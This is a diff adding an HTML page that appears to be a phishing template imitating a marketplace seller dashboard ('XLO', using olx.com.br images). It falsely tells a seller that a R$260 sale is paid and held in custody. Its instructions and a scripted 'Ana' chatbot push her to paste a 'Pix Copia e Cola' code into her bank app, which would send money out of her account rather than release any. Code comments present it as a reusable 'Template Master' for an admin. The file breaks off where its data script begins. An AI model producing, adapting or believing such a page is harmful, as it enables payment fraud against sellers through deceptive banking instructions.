@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Minha Conta - XLO | Painel de Controle</title>
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Google Fonts: Nunito -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            xlo: {
+              purple: '#6E0AD6',
+              purpleHover: '#5808AD',
+              purpleLight: '#F3E8FF',
+              orange: '#F85A00',
+              orangeHover: '#D94E00',
+              bg: '#F2F4F5',
+              dark: '#222222',
+              title: '#1A1D23',
+              grayText: '#707070',
+              border: '#E5E7EB',
+              green: '#00A859',
+              greenHover: '#008A49',
+              greenLight: '#E6F7ED'
+            }
+          },
+          fontFamily: {
+            sans: ['Nunito', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body { font-family: 'Nunito', sans-serif; background-color: #F2F4F5; color: #222222; }
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #f1f1f1; }
+    ::-webkit-scrollbar-thumb { background: #c1c1c1; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #a8a8a8; }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+    @keyframes pulse-ring {
+      0% { transform: scale(0.95); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 0.4; }
+      100% { transform: scale(0.95); opacity: 0.8; }
+    }
+    .bot-ring { animation: pulse-ring 2s infinite ease-in-out; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col antialiased selection:bg-purple-200 selection:text-xlo-purple">
+  <!-- TEMPLATE MASTER V2 | Base visual preservada | Dados centralizados -->
+
+  <header class="bg-xlo-purple w-full h-[72px] flex items-center shadow-md sticky top-0 z-40">
+    <div class="w-full max-w-[1180px] mx-auto px-4 flex justify-between items-center">
+      
+      <!-- Logo XLO -->
+      <div class="flex items-center gap-4 sm:gap-6">
+        <a href="#" onclick="switchTab('vendas')" class="text-3xl font-black text-white tracking-tighter flex items-center gap-1"><span id="brandLogoText">XLO</span></a>
+        <div class="hidden sm:flex items-center bg-white/10 text-white text-xs px-3 py-1.5 rounded-full border border-white/20">
+          <i class="fa-solid fa-shield-halved text-xlo-orange mr-1.5"></i>
+          Central XLO
+        </div>
+      </div>
+
+      <!-- User Profile Pill -->
+      <div class="flex items-center gap-3 sm:gap-4">
+        <div class="flex items-center gap-2 cursor-pointer bg-white/10 hover:bg-white/20 px-3 py-1.5 rounded-full border border-white/20 transition-colors">
+          <div class="w-7 h-7 bg-white text-xlo-purple font-extrabold rounded-full flex items-center justify-center text-xs shadow">
+            <span data-seller-initial>P</span>
+          </div>
+          <span data-seller-name class="text-white text-xs font-bold hidden lg:inline">Patricia Medina</span>
+        </div>
+
+        <button onclick="toggleBot()" class="bg-xlo-orange hover:bg-xlo-orangeHover text-white font-extrabold py-2 px-4 rounded-full transition-all shadow-md text-xs uppercase tracking-wide flex items-center gap-1.5">
+          <i class="fa-solid fa-headset text-sm"></i> Assistente XLO
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <div class="w-full max-w-[1180px] mx-auto px-4 py-6 flex flex-col md:flex-row gap-6 items-start flex-1">
+    
+    <aside class="w-full md:w-[260px] flex-shrink-0">
+      <div class="bg-white rounded-xl shadow-sm border border-xlo-border overflow-hidden sticky top-24">
+        
+        <!-- User Badge -->
+        <div class="p-4 border-b border-xlo-border flex items-center gap-3 bg-gradient-to-r from-purple-50 to-white">
+          <div class="w-12 h-12 bg-xlo-purple text-white font-black rounded-full flex items-center justify-center text-xl shadow">
+            <span data-seller-initial>P</span>
+          </div>
+          <div class="overflow-hidden">
+            <h2 id="sidebarUserName" data-seller-name class="font-bold text-xlo-title text-base leading-tight truncate">Patricia Medina</h2>
+            <p class="text-xs text-xlo-green font-bold flex items-center gap-1 mt-0.5">
+              <i class="fa-solid fa-circle-check"></i> <span data-seller-verified>Vendedor Verificado</span>
+            </p>
+          </div>
+        </div>
+
+        <!-- Menu Tabs Navigation -->
+        <nav class="flex flex-col py-2 text-sm font-semibold text-gray-700">
+          
+          <button id="nav-resumo" onclick="switchTab('resumo')" class="px-5 py-3.5 hover:bg-purple-50/50 flex items-center justify-between transition-colors w-full text-left">
+            <div class="flex items-center gap-3">
+              <i class="fa-solid fa-chart-pie w-5 text-gray-400"></i>
+              <span>Resumo</span>
+            </div>
+            <span class="bg-purple-100 text-xlo-purple text-[10px] font-extrabold px-2 py-0.5 rounded-full">Painel</span>
+          </button>
+
+          <button id="nav-vendas" onclick="switchTab('vendas')" class="px-5 py-3.5 hover:bg-purple-50/50 flex items-center justify-between transition-colors w-full text-left">
+            <div class="flex items-center gap-3">
+              <i class="fa-solid fa-hand-holding-dollar w-5 text-gray-400"></i>
+              <span>Minhas vendas</span>
+            </div>
+            <span id="badgePendingSales" class="bg-xlo-orange text-white text-[10px] font-extrabold px-2 py-0.5 rounded-full animate-pulse">1 AGUARDANDO</span>
+          </button>
+
+          <button id="nav-carteira" onclick="switchTab('carteira')" class="px-5 py-3.5 hover:bg-purple-50/50 flex items-center justify-between transition-colors w-full text-left">
+            <div class="flex items-center gap-3">
+              <i class="fa-solid fa-wallet w-5 text-gray-400"></i>
+              <span></span>
+            </div>
+            <span id="badgeWalletVal" class="text-xs font-bold text-xlo-green">R$ 260,00</span>
+          </button>
+
+          <button id="nav-anuncios" onclick="switchTab('anuncios')" class="px-5 py-3.5 hover:bg-purple-50/50 flex items-center justify-between transition-colors w-full text-left">
+            <div class="flex items-center gap-3">
+              <i class="fa-solid fa-tag w-5 text-gray-400"></i>
+              <span>Meus anúncios</span>
+            </div>
+            <span class="bg-emerald-100 text-emerald-800 text-[10px] font-extrabold px-2 py-0.5 rounded-full">1 VENDIDO</span>
+          </button>
+
+          <button id="nav-compras" onclick="switchTab('compras')" class="px-5 py-3.5 hover:bg-purple-50/50 flex items-center justify-between transition-colors w-full text-left">
+            <div class="flex items-center gap-3">
+              <i class="fa-solid fa-basket-shopping w-5 text-gray-400"></i>
+              <span>Minhas compras</span>
+            </div>
+          </button>
+
+          <button id="nav-configuracoes" onclick="switchTab('configuracoes')" class="px-5 py-3.5 hover:bg-purple-50/50 flex items-center justify-between transition-colors w-full text-left">
+            <div class="flex items-center gap-3">
+              <i class="fa-solid fa-gear w-5 text-gray-400"></i>
+              <span>Configurações</span>
+            </div>
+          </button>
+
+        </nav>
+
+        <!-- Dynamic Quick Status Card inside Sidebar -->
+        <div class="p-4 bg-gray-50 border-t border-xlo-border text-xs text-gray-600">
+          <div class="flex items-center justify-between mb-1">
+            <span class="font-extrabold text-xlo-title uppercase tracking-wider text-[10px]">Status da Venda:</span>
+            <span id="sidebarStatusTag" class="bg-amber-100 text-amber-800 font-extrabold px-2 py-0.5 rounded text-[10px]">Custódia Segura</span>
+          </div>
+          <p class="text-[11px] text-gray-500">Valor protegido pela Ambiente XLO até a validação do código.</p>
+        </div>
+
+      </div>
+    </aside>
+
+    <main class="flex-1 w-full min-w-0 flex flex-col gap-5">
+
+      <section id="view-vendas" class="tab-content active space-y-5">
+        
+        <!-- Breadcrumbs & Status -->
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+          <div class="flex items-center gap-2 text-xs text-xlo-grayText">
+            <a href="#" onclick="switchTab('resumo')" class="hover:underline">Minha conta</a>
+            <i class="fa-solid fa-chevron-right text-[8px]"></i>
+            <span class="text-xlo-dark font-semibold">Minhas Vendas</span>
+            <i class="fa-solid fa-chevron-right text-[8px]"></i>
+            <span class="text-xlo-purple font-bold">Pedido #<span data-order-id>992014883</span></span>
+          </div>
+
+          <span id="salesStatusBadge" class="bg-amber-100 text-amber-800 border border-amber-300 text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1.5 w-fit">
+            <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span>
+            Aguardando Liberação do Saldo
+          </span>
+        </div>
+
+        <h1 class="text-2xl font-black text-xlo-title">Detalhes da Venda</h1>
+
+        <!-- CARD DO PRODUTO -->
+        <div class="bg-white rounded-xl shadow-sm border border-xlo-border overflow-hidden">
+          <div class="bg-purple-50/70 px-6 py-3 border-b border-xlo-border flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs text-xlo-grayText font-semibold">
+            <div class="flex items-center gap-2">
+              <i class="fa-solid fa-shield-halved text-xlo-purple text-sm"></i>
+              <span>Venda com Intermediação <strong class="text-xlo-purple">XLO</strong></span>
+            </div>
+            <div>ID da Transação: <span class="font-mono text-xlo-dark font-bold">#<span data-transaction-id>TX-992014883</span></span></div>
+          </div>
+
+          <div class="p-6 flex flex-col md:flex-row gap-6 items-start">
+            
+            <!-- Foto do Produto -->
+            <div class="w-full md:w-40 h-40 bg-gray-100 rounded-lg border border-gray-200 flex-shrink-0 overflow-hidden relative shadow-inner">
+             <img id="productPhoto" src="https://img.olx.com.br/images/85/853630792833876.webp" alt="Foto do Anúncio" class="w-full h-full object-cover" onerror="this.onerror=null; this.src='https://img.olx.com.br/images/83/833675191517289.webp';">
+              <span class="absolute top-2 left-2 bg-xlo-orange text-white text-[10px] font-black px-2 py-0.5 rounded shadow">
+                VENDIDO
+              </span>
+            </div>
+
+            <!-- Informações do Anúncio -->
+            <div class="flex-1 flex flex-col justify-between h-full">
+              <div>
+                <h2 id="displayProductTitle" class="text-xl font-bold text-xlo-title leading-snug mb-2">
+                  Cômoda
+                </h2>
+
+                <div class="flex items-baseline gap-3 mb-4 flex-wrap">
+                  <span id="displayProductPrice" class="text-3xl font-black text-xlo-purple">R$260,00</span>
+                  <span class="text-xs text-xlo-green font-bold bg-green-50 border border-green-200 px-2.5 py-1 rounded-full flex items-center gap-1 shadow-sm">
+                    <i class="fa-solid fa-lock text-[10px]"></i> Valor Recebido em Custódia
+                  </span>
+                </div>
+              </div>
+
+              <!-- Grid de Dados do Comprador e Região -->
+              <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-4 border-t border-gray-100 text-xs text-gray-600">
+                <div class="flex items-center gap-3">
+                  <div class="w-8 h-8 bg-purple-100 text-xlo-purple rounded-full flex items-center justify-center text-xs flex-shrink-0">
+                    <i class="fa-regular fa-user"></i>
+                  </div>
+                  <div>
+                    <p class="text-[10px] text-gray-400 font-extrabold uppercase">Comprador</p>
+                    <p id="displayBuyerName" class="font-bold text-xlo-title text-sm">Osmar Britz.</p>
+                  </div>
+                </div>
+
+                <div class="flex items-center gap-3">
+                  <div class="w-8 h-8 bg-purple-100 text-xlo-purple rounded-full flex items-center justify-center text-xs flex-shrink-0">
+                    <i class="fa-solid fa-location-dot"></i>
+                  </div>
+                  <div>
+                    <p class="text-[10px] text-gray-400 font-extrabold uppercase">Região de Entrega</p>
+                    <p id="displayLocation" class="font-bold text-xlo-title text-xs">São Luiz Gonzaga, RS</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- TIMELINE DE LIBERAÇÃO -->
+        <div class="bg-white rounded-xl shadow-sm border border-xlo-border p-6">
+          <h3 class="font-extrabold text-base text-xlo-title mb-6 flex items-center gap-2">
+            <i class="fa-solid fa-bars-staggered text-xlo-purple"></i>
+            Progresso da Transferência Bancária
+          </h3>
+          
+          <div class="relative flex flex-col md:flex-row justify-between items-start md:items-center gap-6 md:gap-0">
+            <div class="hidden md:block absolute top-5 left-[15%] right-[15%] h-1 bg-gray-200 z-0"></div>
+            <div id="timelineProgressBar" class="hidden md:block absolute top-5 left-[15%] w-[35%] h-1 bg-xlo-green z-0 transition-all duration-500"></div>
+
+            <div class="relative z-10 flex flex-row md:flex-col items-center gap-3 md:gap-2 w-full md:w-1/3 text-left md:text-center">
+              <div class="w-10 h-10 rounded-full bg-xlo-green text-white flex items-center justify-center text-base font-bold shadow">
+                <i class="fa-solid fa-check"></i>
+              </div>
+              <div>
+                <p class="font-bold text-xlo-title text-sm">1. Pagamento Confirmado</p>
+                <p class="text-xs text-gray-500">Comprador pagou via Pix/XLO</p>
+              </div>
+            </div>
+
+            <div class="relative z-10 flex flex-row md:flex-col items-center gap-3 md:gap-2 w-full md:w-1/3 text-left md:text-center">
+              <div class="w-10 h-10 rounded-full bg-xlo-green text-white flex items-center justify-center text-base font-bold shadow">
+                <i class="fa-solid fa-shield-halved"></i>
+              </div>
+              <div>
+                <p class="font-bold text-xlo-title text-sm">2. Saldo em Custódia</p>
+                <p id="timelineEscrowVal" class="text-xs text-gray-500">R$ 260,00 mantidos com segurança</p>
+              </div>
+            </div>
+
+            <div id="step3Indicator" class="relative z-10 flex flex-row md:flex-col items-center gap-3 md:gap-2 w-full md:w-1/3 text-left md:text-center">
+              <div class="w-10 h-10 rounded-full bg-white border-[3px] border-amber-500 text-amber-500 flex items-center justify-center text-base font-bold shadow animate-bounce">
+                <i class="fa-solid fa-key"></i>
+              </div>
+              <div>
+                <p class="font-bold text-amber-600 text-sm">3. Validação do Código</p>
+                <p class="text-xs text-gray-500">Aguardando cópia e cadastro</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CARD DO CÓDIGO BANCÁRIO / AÇÃO DE COPIAR E CONTINUAR -->
+        <div id="actionArea" class="bg-white rounded-xl shadow-md border-2 border-xlo-purple p-6 md:p-8 relative">
+          <div class="flex items-start gap-4 mb-5">
+            <div class="w-12 h-12 bg-purple-100 text-xlo-purple rounded-xl flex items-center justify-center text-2xl flex-shrink-0 shadow-inner">
+              <i class="fa-brands fa-pix text-2xl text-teal-600"></i>
+            </div>
+            <div>
+              <h3 class="text-xl font-black text-xlo-title">Informações da Venda</h3>
+              <p class="text-sm text-gray-600 mt-1 leading-relaxed">
+                Valor da venda: <strong id="boxAmount" class="text-xlo-purple font-black">R$ 260,00</strong>, esta área será controlada pelo ADM e pode exibir informações da venda.
+              </p>
+            </div>
+          </div>
+
+          <!-- Input Box do Código -->
+          <div class="bg-gray-50 border border-gray-300 rounded-xl p-5 mb-6">
+            <div class="flex justify-between items-center mb-2">
+              <label class="block text-xs font-black text-gray-500 uppercase tracking-wider">
+                <i class="fa-solid fa-barcode text-xlo-purple mr-1"></i> 
+                Código de referência da venda
+              </label>
+              <span class="text-[11px] text-xlo-green font-bold flex items-center gap-1">
+                <i class="fa-solid fa-shield-check"></i> Pronto para Copiar
+              </span>
+            </div>
+
+            <div class="flex flex-col sm:flex-row gap-3">
+              <div class="relative flex-1">
+                <input type="text" id="copyCodeInput" placeholder="Payload Pix" class="w-full bg-white border border-gray-300 rounded-lg py-3.5 px-4 text-xs font-mono font-bold text-gray-800 focus:outline-none focus:border-xlo-purple shadow-inner pr-10 select-all" readonly="">
+                <i class="fa-solid fa-copy absolute right-3.5 top-1/2 -translate-y-1/2 text-xlo-purple text-lg pointer-events-none"></i>
+              </div>
+
+              <button onclick="handleCopyAndGuide()" class="bg-xlo-purple hover:bg-xlo-purpleHover text-white font-black py-3.5 px-6 rounded-lg transition-all flex items-center justify-center gap-2 whitespace-nowrap shadow-md text-sm active:scale-95">
+                <i class="fa-solid fa-copy text-base"></i>
+                Copiar Referência
+              </button>
+            </div>
+
+            <div id="pixInstructions" class="hidden mt-4 p-4 bg-purple-50 border border-purple-200 rounded-lg text-xs text-purple-900 space-y-2">
+              <p class="font-black text-xlo-purple flex items-center gap-1.5 text-sm">
+                <i class="fa-solid fa-circle-info"></i> Informações:
+              </p>
+              <ol class="list-decimal pl-5 space-y-1 font-semibold">
+                <li>Abra o aplicativo do seu banco (ex: Nubank, Itaú, Caixa, Bradesco, etc.).</li>
+                <li>Entre na opção <strong class="text-teal-700">PIX</strong> e depois em <strong class="text-teal-700">Pix Copia e Cola</strong>.</li>
+                <li>Cole o código que acabou de copiar e confirme a validação.</li>
+                <li>Volte aqui e clique no botão abaixo para cadastrar sua conta de destino!</li>
+              </ol>
+            </div>
+          </div>
+
+          <!-- Botão Continuar para Cadastrar Conta -->
+          <button onclick="handleContinuarValidation()" class="w-full bg-xlo-orange hover:bg-xlo-orangeHover text-white font-black text-base py-4 px-8 rounded-full shadow-lg transition-all transform active:scale-[0.99] flex items-center justify-center gap-3 uppercase tracking-wide">
+            <i class="fa-solid fa-arrow-right-to-bracket text-xl"></i>
+            <span>Continuar</span>
+          </button>
+        </div>
+
+        <!-- TELA DE SUCESSO -->
+        <div id="successArea" class="hidden bg-white rounded-xl shadow-sm border border-xlo-green p-8 text-center">
+          <div class="w-20 h-20 bg-green-100 text-xlo-green rounded-full flex items-center justify-center text-4xl mx-auto mb-4 shadow-inner">
+            <i class="fa-solid fa-check"></i>
+          </div>
+          <h2 class="text-2xl font-black text-xlo-title mb-2">Conta Cadastrada e Saldo Liberado!</h2>
+          <p class="text-sm text-gray-600 max-w-md mx-auto mb-6 leading-relaxed">
+            O valor de <strong id="successAmount" class="text-xlo-dark font-black">R$ 260,00</strong> foi transferido com sucesso para a sua chave Pix cadastrada.
+          </p>
+          
+          <div class="flex flex-col sm:flex-row gap-3 justify-center">
+            <button onclick="switchTab('carteira')" class="bg-xlo-purple hover:bg-xlo-purpleHover text-white font-extrabold py-3 px-6 rounded-full transition-colors text-sm shadow">
+              <i class="fa-solid fa-wallet mr-2"></i> Ver Saldo na Carteira XLO
+            </button>
+            <button onclick="switchTab('resumo')" class="bg-gray-100 hover:bg-gray-200 text-gray-800 font-extrabold py-3 px-6 rounded-full transition-colors text-sm">
+              <i class="fa-solid fa-house mr-2"></i> Voltar ao Resumo
+            </button>
+          </div>
+        </div>
+
+      </section>
+
+      <section id="view-resumo" class="tab-content space-y-5">
+        <h1 class="text-2xl font-black text-xlo-title">Resumo da Conta</h1>
+        
+        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+          <div class="bg-white p-5 rounded-xl border border-xlo-border shadow-sm flex items-center gap-4">
+            <div class="w-12 h-12 bg-amber-100 text-amber-700 rounded-lg flex items-center justify-center text-xl font-bold">
+              <i class="fa-solid fa-clock"></i>
+            </div>
+            <div>
+              <p class="text-xs font-bold text-gray-500 uppercase">Em Custódia</p>
+              <p id="resumoPending" class="text-xl font-black text-xlo-title">R$ 260,00</p>
+              <p class="text-[10px] text-amber-600 font-bold">1 venda aguardando</p>
+            </div>
+          </div>
+
+          <div class="bg-white p-5 rounded-xl border border-xlo-border shadow-sm flex items-center gap-4">
+            <div class="w-12 h-12 bg-green-100 text-xlo-green rounded-lg flex items-center justify-center text-xl font-bold">
+              <i class="fa-solid fa-wallet"></i>
+            </div>
+            <div>
+              <p class="text-xs font-bold text-gray-500 uppercase">Saldo Disponível</p>
+              <p id="resumoAvailable" class="text-xl font-black text-xlo-green">R$ 0,00</p>
+              <p class="text-[10px] text-gray-400">Pronto para Pix</p>
+            </div>
+          </div>
+
+          <div class="bg-white p-5 rounded-xl border border-xlo-border shadow-sm flex items-center gap-4">
+            <div class="w-12 h-12 bg-purple-100 text-xlo-purple rounded-lg flex items-center justify-center text-xl font-bold">
+              <i class="fa-solid fa-tag"></i>
+            </div>
+            <div>
+              <p class="text-xs font-bold text-gray-500 uppercase">Anúncios</p>
+              <p class="text-xl font-black text-xlo-title">1 Vendido</p>
+              <p class="text-[10px] text-xlo-purple font-bold">Ambiente XLO</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-gradient-to-r from-purple-900 to-xlo-purple text-white p-6 rounded-xl shadow-md flex flex-col md:flex-row items-center justify-between gap-4">
+          <div class="flex items-center gap-4">
+            <div class="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center text-2xl flex-shrink-0">
+              <i class="fa-solid fa-bell animate-bounce text-amber-300"></i>
+            </div>
+            <div>
+              <h3 class="font-extrabold text-lg">Ação necessária na sua venda recente</h3>
+              <p class="text-xs text-purple-200 mt-0.5">
+                Copie o Pix e cadastre sua conta para receber R$ 260,00 em instantes.
+              </p>
+            </div>
+          </div>
+          <button onclick="switchTab('vendas')" class="bg-xlo-orange hover:bg-xlo-orangeHover text-white font-extrabold px-6 py-3 rounded-full text-xs uppercase tracking-wider whitespace-nowrap shadow transition-all">
+            Ir para Vendas
+          </button>
+        </div>
+      </section>
+
+      <section id="view-carteira" class="tab-content space-y-5">
+        <div class="flex items-center justify-between">
+          <h1 class="text-2xl font-black text-xlo-title"></h1>
+          <span class="bg-green-100 text-xlo-green text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1.5">
+            <i class="fa-solid fa-bolt"></i> Transferências Pix 24h
+          </span>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <div class="bg-white rounded-xl border-2 border-amber-300 p-6 shadow-sm relative overflow-hidden">
+            <p class="text-xs font-black text-amber-700 uppercase tracking-wider mb-1">Saldo em Custódia</p>
+            <p id="carteiraCustodyVal" class="text-3xl font-black text-amber-600 mb-2">R$ 260,00</p>
+            <p class="text-xs text-gray-500 mb-4">Complete a cópia do Pix e cadastro para liberar.</p>
+            <button onclick="switchTab('vendas')" class="bg-amber-500 hover:bg-amber-600 text-white font-extrabold text-xs py-2.5 px-4 rounded-lg shadow">
+              Liberar Saldo Agora
+            </button>
+          </div>
+
+          <div class="bg-white rounded-xl border-2 border-xlo-green p-6 shadow-sm relative overflow-hidden">
+            <p class="text-xs font-black text-xlo-green uppercase tracking-wider mb-1">Saldo Disponível para Saque</p>
+            <p id="carteiraAvailableVal" class="text-3xl font-black text-xlo-green mb-2">R$ 0,00</p>
+            <p class="text-xs text-gray-500 mb-4">Pronto para saque imediato via Pix.</p>
+            <button id="btnSaquePix" disabled="" class="bg-gray-200 text-gray-400 cursor-not-allowed font-extrabold text-xs py-2.5 px-4 rounded-lg shadow">
+              <i class="fa-brands fa-pix mr-1.5"></i> Sacar via Pix
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <section id="view-anuncios" class="tab-content space-y-5">
+        <h1 class="text-2xl font-black text-xlo-title">Meus Anúncios</h1>
+        <div class="bg-white rounded-xl shadow-sm border border-xlo-border overflow-hidden p-5 flex flex-col sm:flex-row gap-5 items-center">
+          <div class="w-full sm:w-32 h-32 bg-gray-100 rounded-lg overflow-hidden flex-shrink-0 relative">
+            <img data-product-image src="https://img.olx.com.br/images/85/853630792833876.webp" class="w-full h-full object-cover">
+            <span class="absolute top-2 left-2 bg-red-600 text-white text-[10px] font-black px-2 py-0.5 rounded uppercase">Vendido</span>
+          </div>
+          <div class="flex-1 w-full space-y-2">
+            <h3 data-product-title class="font-bold text-xlo-title text-base">Cômoda</h3>
+            <span data-product-price class="font-black text-xlo-purple text-lg">R$ 260,00</span>
+            <div>
+              <button onclick="switchTab('vendas')" class="text-xlo-purple text-xs font-bold hover:underline">Ver detalhes e liberar pagamento →</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="view-compras" class="tab-content space-y-5">
+        <h1 class="text-2xl font-black text-xlo-title">Minhas Compras</h1>
+        <div class="bg-white rounded-xl shadow-sm border border-xlo-border p-8 text-center">
+          <p class="text-xs text-gray-500">Nenhuma compra pendente.</p>
+        </div>
+      </section>
+
+      <section id="view-configuracoes" class="tab-content space-y-5">
+        <h1 class="text-2xl font-black text-xlo-title">Configurações do Perfil</h1>
+        <div class="bg-white rounded-xl shadow-sm border border-xlo-border p-6 space-y-4">
+          <p class="text-xs font-bold text-gray-700">Nome: Patricia Medina</p>
+          <p class="text-xs font-bold text-gray-700">Status: Verificado</p>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <div id="accountModal" class="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 hidden">
+    <div class="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl border border-purple-200 transform transition-all">
+      <div class="flex justify-between items-center mb-4 pb-3 border-b border-gray-100">
+        <div class="flex items-center gap-2">
+          <div class="w-9 h-9 bg-purple-100 text-xlo-purple rounded-full flex items-center justify-center font-bold">
+            <i class="fa-solid fa-wallet"></i>
+          </div>
+          <h3 class="font-black text-lg text-xlo-title">Dados da Venda</h3>
+        </div>
+        <button onclick="closeAccountModal()" class="text-gray-400 hover:text-gray-700 font-bold text-lg">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+
+      <p class="text-xs text-gray-600 mb-5">
+        Informe seus dados bancários ou chave Pix onde deseja receber os <strong class="text-xlo-purple font-black">R$ 260,00</strong> após a validação do Pix Copia e Cola.
+      </p>
+
+      <div class="space-y-4 text-xs font-semibold">
+        <div>
+          <label class="block text-gray-700 mb-1">Tipo de informação</label>
+          <select id="pixKeyType" class="w-full bg-gray-50 border border-gray-300 rounded-lg p-3 focus:outline-none focus:border-xlo-purple">
+            <option>CPF / CNPJ</option>
+            <option>E-mail</option>
+            <option>Número de Telefone</option>
+            <option>Chave Aleatória (EVP)</option>
+          </select>
+        </div>
+
+        <div>
+          <label class="block text-gray-700 mb-1">Referência</label>
+          <input type="text" id="pixKeyValue" value="demo@xlo.local" class="w-full bg-gray-50 border border-gray-300 rounded-lg p-3 font-mono">
+        </div>
+
+        <div>
+          <label class="block text-gray-700 mb-1">Nome relacionado</label>
+          <input type="text" value="Patricia Medina" class="w-full bg-gray-50 border border-gray-300 rounded-lg p-3">
+        </div>
+
+        <div class="bg-amber-50 border border-amber-200 p-3 rounded-lg text-amber-800 text-[11px] flex items-start gap-2">
+          <i class="fa-solid fa-triangle-exclamation text-amber-600 mt-0.5"></i>
+          <span>Certifique-se de que a chave Pix pertence ao mesmo titular da conta XLO para evitar bloqueios de segurança.</span>
+        </div>
+      </div>
+
+      <div class="mt-6 flex gap-3">
+        <button onclick="closeAccountModal()" class="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-700 font-extrabold py-3 rounded-xl transition-colors">
+          Cancelar
+        </button>
+        <button onclick="confirmAndFinalize()" class="flex-1 bg-xlo-green hover:bg-xlo-greenHover text-white font-black py-3 rounded-xl shadow-lg transition-all">
+          Confirmar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div id="chatBotWidget" class="fixed bottom-6 right-6 z-50 flex flex-col items-end">
+    <!-- Janela do Chat -->
+    <div id="chatWindow" class="hidden bg-white rounded-2xl shadow-2xl border border-purple-200 w-80 sm:w-96 mb-4 overflow-hidden flex flex-col transition-all">
+      <div class="bg-xlo-purple text-white p-4 flex items-center justify-between">
+        <div class="flex items-center gap-3">
+          <div class="w-9 h-9 bg-xlo-orange text-white rounded-full flex items-center justify-center font-bold shadow">
+            <i class="fa-solid fa-robot"></i>
+          </div>
+          <div>
+            <h3 class="font-black text-sm">Ana - Assistente XLO Pay</h3>
+            <p class="text-[10px] text-purple-200 flex items-center gap-1">
+              <span class="w-2 h-2 rounded-full bg-green-400"></span> Online com Voz Ativa
+            </p>
+          </div>
+        </div>
+        <button onclick="toggleBot()" class="text-white hover:text-gray-200 text-base">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+
+      <div id="chatMessages" class="p-4 bg-gray-50 h-72 overflow-y-auto space-y-3 text-xs">
+        <div class="flex items-start gap-2">
+          <div class="w-7 h-7 bg-xlo-purple text-white rounded-full flex items-center justify-center flex-shrink-0 text-[10px]">
+            <i class="fa-solid fa-robot"></i>
+          </div>
+          <div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200 text-gray-800 space-y-1">
+            <p class="font-bold">Olá, Osmar! Sou a Ana do XLO Pay.</p>
+            <p>Esse código Pix é para <strong>cadastrar a conta de recebimento dos valores</strong>, validar o banco e receber na hora imediatamente! Clique em <strong>Copiar Referência</strong> para começar.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="p-3 bg-white border-t border-gray-200 flex items-center gap-2">
+        <button onclick="speakBotText('Esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente! Copie o código, abra seu banco e cole na opção Pix Copia e Cola.')" class="bg-purple-100 hover:bg-purple-200 text-xlo-purple font-bold px-3 py-2 rounded-lg text-xs flex items-center gap-1.5 transition-colors">
+          <i class="fa-solid fa-volume-high"></i> Ouvir Instruções
+        </button>
+        <button onclick="handleCopyAndGuide()" class="flex-1 bg-xlo-orange hover:bg-xlo-orangeHover text-white font-black py-2 px-3 rounded-lg text-xs shadow transition-all">
+          Copiar Referência
+        </button>
+      </div>
+    </div>
+
+    <!-- Botão Flutuante do Robô -->
+    <button onclick="toggleBot()" class="relative group bg-xlo-purple hover:bg-xlo-purpleHover text-white w-14 h-14 rounded-full shadow-2xl flex items-center justify-center text-2xl transition-all transform hover:scale-105 active:scale-95">
+      <div class="absolute -inset-1 rounded-full bg-xlo-orange opacity-70 blur bot-ring pointer-events-none"></div>
+      <i class="fa-solid fa-headset relative z-10"></i>
+      <span class="absolute -top-1 -right-1 bg-xlo-orange text-white text-[10px] font-black px-1.5 py-0.5 rounded-full shadow">1</span>
+    </button>
+  </div>
+
+  <!-- TOAST NOTIFICATION -->
+  <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-gray-900 text-white text-xs font-bold px-6 py-3.5 rounded-full shadow-2xl translate-y-24 opacity-0 transition-all duration-300 z-50 flex items-center gap-3 pointer-events-none">
+    <i class="fa-solid fa-circle-check text-xlo-green text-base"></i>
+    <span id="toastMsg">Ação concluída com sucesso!</span>
+  </div>
+
+  <script>
+
+    // ============================================================
+    // TEMPLATE MASTER V2
+    // Dados variáveis centralizados para o futuro ADM.
+    // ============================================================
+    const PAGE_DATA = {
